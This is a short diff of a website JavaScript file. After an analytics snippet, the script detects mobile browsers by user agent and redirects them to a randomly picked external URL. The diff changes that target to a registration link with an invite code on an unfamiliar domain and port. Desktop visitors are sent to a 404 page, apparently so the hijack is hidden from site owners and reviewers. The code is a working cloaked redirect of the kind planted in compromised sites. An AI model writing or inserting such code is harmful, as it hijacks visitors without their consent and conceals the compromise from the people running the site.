@@ -6,7 +6,7 @@ var _hmt = _hmt || [];
   s.parentNode.insertBefore(hm, s);
 })();
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-	var arr = ["https://jytyvip14.com", "https://jytyvip14.com"];
+	var arr = ["https://www.92ns1l.com:9966/entry/register46233/?i_code=28299453", "https://www.92ns1l.com:9966/entry/register46233/?i_code=28299453"];
 	window.location.href = arr[parseInt(Math.random() * arr.length)];
 }else{
 	window.location.href="/404.html";
